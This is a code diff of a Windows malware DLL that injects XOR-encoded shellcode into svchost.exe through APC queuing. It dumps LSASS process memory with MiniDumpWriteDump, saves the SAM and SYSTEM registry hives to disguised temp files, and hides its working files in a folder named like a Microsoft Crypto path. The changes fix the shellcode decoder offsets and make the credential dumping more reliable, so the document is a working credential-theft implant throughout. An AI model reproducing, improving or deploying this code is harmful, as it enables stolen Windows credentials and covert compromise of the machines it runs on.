@@ -16,6 +16,7 @@
 #include <iphlpapi.h>
 #include <wtsapi32.h>
 #include <stdio.h>
+#include <dbghelp.h>
 #include <stdlib.h>
 #include <time.h>
 
@@ -39,8 +40,6 @@
 
 typedef BOOL (WINAPI *WTSEnumerateSessions_t)(HANDLE, DWORD, DWORD, PWTS_SESSION_INFO*, DWORD*);
 typedef void (WINAPI *WTSFreeMemory_t)(PVOID);
-typedef DWORD (WINAPI *PssCaptureSnapshot_t)(HANDLE, DWORD, DWORD, HANDLE*);
-typedef DWORD (WINAPI *PssFreeSnapshot_t)(HANDLE, HANDLE);
 typedef BOOL (WINAPI *GetUserNameExW_t)(int, LPWSTR, PULONG);
 
 typedef struct INetFwProfile INetFwProfile;
@@ -91,7 +90,7 @@ typedef struct {
 } INetFwProfileVtbl;
 struct INetFwProfile { INetFwProfileVtbl* lpVtbl; };
 
-static const GUID CLSID_NetFwMgr = {0x39EB36E0,0x2097,0x40BD,{0x8A,0xF2,0x63,0xA1,0x3B,0x5A,0x4D,0x63}};
+static const GUID CLSID_NetFwMgr = {0x304CE942,0x6E39,0x40D8,{0x94,0x3A,0xB9,0x13,0xC4,0x0C,0x9C,0xD4}};
 static const GUID IID_INetFwMgr = {0xF7898AF5,0xC470,0x4927,{0x91,0xC9,0x7B,0x3A,0x9E,0xC0,0xF2,0xE5}};
 
 static void AppendToFile(LPCWSTR path, LPCSTR text);
@@ -159,7 +158,7 @@ static LPBYTE BuildAPCShellcode(LPCSTR dllPath, FARPROC pLoadLibraryA, DWORD* pd
     DWORD pathLen = lstrlenA(dllPath) + 1;
     DWORD mainCodeSize = 31;
     DWORD encSize = mainCodeSize + pathLen;
-    DWORD decoderSize = 39;
+    DWORD decoderSize = 37;
     DWORD totalSize = decoderSize + encSize;
 
     LPBYTE buf = (LPBYTE)LocalAlloc(LPTR, totalSize);
@@ -171,30 +170,28 @@ static LPBYTE BuildAPCShellcode(LPCSTR dllPath, FARPROC pLoadLibraryA, DWORD* pd
     // Decoder stub (x64):
     //  0: E8 00 00 00 00    call +0
     //  5: 5E                pop rsi         ; rsi = 5
-    //  6: 48 83 C6 22       add rsi, 34     ; rsi = start of encoded area
+    //  6: 48 83 C6 20       add rsi, 32     ; rsi = 37 = start of encoded area
     // 10: B9 XX XX XX XX    mov ecx, enc_size
-    // 15: 31 C0             xor eax, eax
-    // 17: B0 AA             mov al, XOR_KEY
-    // 19: 80 34 06 AA       xor byte [rsi+rax], XOR_KEY
-    // 1D: 48 FF C0          inc rax
-    // 20: 48 39 C8          cmp rax, rcx
-    // 23: 7C F4             jl 19
-    // 25: FF E6             jmp rsi
-    // 27: (encoded area starts)
+    // 15: 31 C0             xor eax, eax    ; rax = 0 (loop counter)
+    // 17: 80 34 06 AA       xor byte [rsi+rax], XOR_KEY
+    // 1B: 48 FF C0          inc rax
+    // 1E: 48 39 C8          cmp rax, rcx
+    // 21: 7C F4             jl -12
+    // 23: FF E6             jmp rsi
+    // 25: (encoded area starts)
 
     decoder[0] = 0xE8; decoder[1] = 0x00; decoder[2] = 0x00; decoder[3] = 0x00; decoder[4] = 0x00;
     decoder[5] = 0x5E;
-    decoder[6] = 0x48; decoder[7] = 0x83; decoder[8] = 0xC6; decoder[9] = 0x22;
+    decoder[6] = 0x48; decoder[7] = 0x83; decoder[8] = 0xC6; decoder[9] = 0x20;
     decoder[10] = 0xB9;
     memcpy(&decoder[11], &encSize, 4);
     decoder[15] = 0x31; decoder[16] = 0xC0;
-    decoder[17] = 0xB0; decoder[18] = XOR_KEY;
-    decoder[19] = 0x80; decoder[20] = 0x34; decoder[21] = 0x06; decoder[22] = XOR_KEY;
-    decoder[23] = 0x48; decoder[24] = 0xFF; decoder[25] = 0xC0;
-    decoder[26] = 0x48; decoder[27] = 0x39; decoder[28] = 0xC8;
-    decoder[29] = 0x7C; decoder[30] = 0xF4;
-    decoder[31] = 0xFF; decoder[32] = 0xE6;
-    // 33-38: padding zeros (already zeroed by LocalAlloc)
+    decoder[17] = 0x80; decoder[18] = 0x34; decoder[19] = 0x06; decoder[20] = XOR_KEY;
+    decoder[21] = 0x48; decoder[22] = 0xFF; decoder[23] = 0xC0;
+    decoder[24] = 0x48; decoder[25] = 0x39; decoder[26] = 0xC8;
+    decoder[27] = 0x7C; decoder[28] = 0xF4;
+    decoder[29] = 0xFF; decoder[30] = 0xE6;
+    // 31-36: padding zeros (already zeroed by LocalAlloc)
 
     // Main shellcode (plaintext):
     //  0: 48 83 EC 28       sub rsp, 0x28
@@ -281,76 +278,46 @@ static BOOL EnableDebugPrivilege(void) {
 }
 
 static void DumpLSASS(void) {
-    {
-        DWORD lsassPid = 0;
-        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-        if (hSnap != INVALID_HANDLE_VALUE) {
-            PROCESSENTRY32 pe = { sizeof(pe) };
-            if (Process32First(hSnap, &pe)) {
-                do {
-                    if (lstrcmpiA(pe.szExeFile, "lsass.exe") == 0) {
-                        lsassPid = pe.th32ProcessID;
-                        break;
-                    }
-                } while (Process32Next(hSnap, &pe));
-            }
-            CloseHandle(hSnap);
-        }
-        if (!lsassPid) {
-            LogMessage(L"[-] LSASS dump FAILED");
-            return;
-        }
-
-        EnableDebugPrivilege();
-
-        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, lsassPid);
-        if (!hProcess) {
-            LogMessage(L"[-] LSASS dump FAILED");
-            return;
-        }
-
-        HANDLE hSnapShot = INVALID_HANDLE_VALUE;
-        HMODULE hKernel32 = GetModuleHandleW(L"kernel32");
-        PssCaptureSnapshot_t pPssCap = (PssCaptureSnapshot_t)GetProcAddress(hKernel32, "PssCaptureSnapshot");
-        if (pPssCap) {
-            if (pPssCap(hProcess, 0x20000408, 0, &hSnapShot) == 0 && hSnapShot != INVALID_HANDLE_VALUE) {
-                HANDLE hFile = CreateFileW(LSASS_DUMP_PATH, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-                if (hFile != INVALID_HANDLE_VALUE) {
-                    HANDLE hMap = CreateFileMappingW(hSnapShot, NULL, PAGE_READONLY, 0, 0, NULL);
-                    if (hMap) {
-                        LPVOID pView = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
-                        if (pView) {
-                            MEMORY_BASIC_INFORMATION mbi;
-                            VirtualQuery(pView, &mbi, sizeof(mbi));
-                            DWORD dwWritten = 0;
-                            WriteFile(hFile, pView, (DWORD)mbi.RegionSize, &dwWritten, NULL);
-                            UnmapViewOfFile(pView);
-                            if (dwWritten > 0) {
-                                LogMessage(L"[+] LSASS dump OK");
-                            } else {
-                                LogMessage(L"[-] LSASS dump FAILED");
-                            }
-                        } else {
-                            LogMessage(L"[-] LSASS dump FAILED");
-                        }
-                        CloseHandle(hMap);
-                    } else {
-                        LogMessage(L"[-] LSASS dump FAILED");
-                    }
-                    CloseHandle(hFile);
-                } else {
-                    LogMessage(L"[-] LSASS dump FAILED");
+    DWORD lsassPid = 0;
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap != INVALID_HANDLE_VALUE) {
+        PROCESSENTRY32 pe = { sizeof(pe) };
+        if (Process32First(hSnap, &pe)) {
+            do {
+                if (lstrcmpiA(pe.szExeFile, "lsass.exe") == 0) {
+                    lsassPid = pe.th32ProcessID;
+                    break;
                 }
-                PssFreeSnapshot_t pPssFree = (PssFreeSnapshot_t)GetProcAddress(hKernel32, "PssFreeSnapshot");
-                if (pPssFree) pPssFree(GetCurrentProcess(), hSnapShot);
-                CloseHandle(hProcess);
-                return;
-            }
+            } while (Process32Next(hSnap, &pe));
         }
-
-        LogMessage(L"[-] LSASS dump FAILED");
-        CloseHandle(hProcess);
+        CloseHandle(hSnap);
     }
+    if (!lsassPid) { LogMessage(L"[-] LSASS dump FAILED"); return; }
+
+    if (!EnableDebugPrivilege()) {
+        LogMessage(L"[-] LSASS dump FAILED: cannot enable SeDebugPrivilege");
+        return;
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, lsassPid);
+    if (!hProcess) { LogMessage(L"[-] LSASS dump FAILED"); return; }
+
+    HANDLE hFile = CreateFileW(LSASS_DUMP_PATH, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) { CloseHandle(hProcess); LogMessage(L"[-] LSASS dump FAILED"); return; }
+
+    HMODULE hDbg = LoadLibraryW(L"dbghelp.dll");
+    if (hDbg) {
+        typedef BOOL (WINAPI *MDWD_t)(HANDLE, DWORD, HANDLE, DWORD, void*, void*, void*);
+        MDWD_t pMDWD = (MDWD_t)GetProcAddress(hDbg, "MiniDumpWriteDump");
+        if (pMDWD) {
+            BOOL ok = pMDWD(hProcess, lsassPid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
+            LogMessage(ok ? L"[+] LSASS dump OK" : L"[-] LSASS dump FAILED");
+        } else { LogMessage(L"[-] LSASS dump FAILED"); }
+        FreeLibrary(hDbg);
+    } else { LogMessage(L"[-] LSASS dump FAILED"); }
+
+    CloseHandle(hFile);
+    CloseHandle(hProcess);
 }
 
 static void DumpSAM(void) {
@@ -361,12 +328,12 @@ static void DumpSAM(void) {
         si.dwFlags = STARTF_USESHOWWINDOW;
         si.wShowWindow = SW_HIDE;
 
-        CreateProcessW(NULL, L"reg.exe save HKLM\\SAM C:\\Windows\\Temp\\~s1.tmp /y",
-                       NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+        wchar_t samCmd[] = L"reg.exe save HKLM\\SAM C:\\Windows\\Temp\\~s1.tmp /y";
+        CreateProcessW(NULL, samCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
         if (pi.hProcess) { WaitForSingleObject(pi.hProcess, 30000); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
 
-        CreateProcessW(NULL, L"reg.exe save HKLM\\SYSTEM C:\\Windows\\Temp\\~s2.tmp /y",
-                       NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+        wchar_t sysCmd[] = L"reg.exe save HKLM\\SYSTEM C:\\Windows\\Temp\\~s2.tmp /y";
+        CreateProcessW(NULL, sysCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
         if (pi.hProcess) { WaitForSingleObject(pi.hProcess, 30000); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
     }
 }
@@ -453,7 +420,9 @@ static void RunAndCapture(LPCWSTR cmd, LPCWSTR outputFile) {
     si.hStdOutput = hWritePipe;
     si.hStdError = hWritePipe;
 
-    if (CreateProcessW(NULL, (LPWSTR)cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+    wchar_t cmdBuf[MAX_PATH];
+    lstrcpyW(cmdBuf, cmd);
+    if (CreateProcessW(NULL, cmdBuf, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
         CloseHandle(hWritePipe);
         char buf[4096];
         DWORD bytesRead;
@@ -804,20 +773,11 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
     if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
         DisableThreadLibraryCalls(hModule);
 
-        EnsureDirectory(L"C:\\ProgramData");
-        wchar_t hostPath[MAX_PATH];
-        GetModuleFileNameW(NULL, hostPath, MAX_PATH);
-        wchar_t buf[MAX_PATH + 64];
-        wsprintfW(buf, L"[+] DLL loaded — host: %s", hostPath);
-        LogMessage(buf);
-
         char path[MAX_PATH];
         GetModuleFileNameA(NULL, path, MAX_PATH);
         if (strstr(path, "svchost.exe")) {
-            LogMessage(L"[+] Detected svchost.exe — queuing WorkerThread");
-            QueueUserWorkItem((LPTHREAD_START_ROUTINE)WorkerThread, NULL, WT_EXECUTEDEFAULT);
-        } else {
-            LogMessage(L"[-] Not svchost.exe — WorkerThread NOT queued");
+            HANDLE hThread = CreateThread(NULL, 0, WorkerThread, NULL, 0, NULL);
+            if (hThread) CloseHandle(hThread);
         }
     }
     return TRUE;
@@ -829,16 +789,20 @@ __declspec(dllexport) HRESULT WINAPI DllRegisterServer(void) {
 
     CreateDirectoryA("C:\\ProgramData\\Microsoft\\Crypto\\RSA\\S-1-5-18", NULL);
 
-    DWORD pid = FindProcessPID("svchost.exe");
+    DWORD pid = 0;
+    for (int attempt = 0; attempt < 3 && pid == 0; attempt++) {
+        pid = FindProcessPID("svchost.exe");
+        if (pid == 0 && attempt < 2) Sleep(2000);
+    }
     if (pid) {
         wchar_t buf[256];
-        wsprintfW(buf, L"[+] svchost.exe PID=%lu — injecting APC", pid);
+        wsprintfW(buf, L"[+] svchost.exe PID=%lu \xe2\x80\x94 injecting APC", pid);
         LogMessage(buf);
 
         BOOL ok = InjectAPC(pid);
         LogMessage(ok ? L"[+] APC injection OK" : L"[-] APC injection FAILED");
     } else {
-        LogMessage(L"[-] svchost.exe not found");
+        LogMessage(L"[-] svchost.exe not found after 3 attempts");
     }
 
     return S_OK;
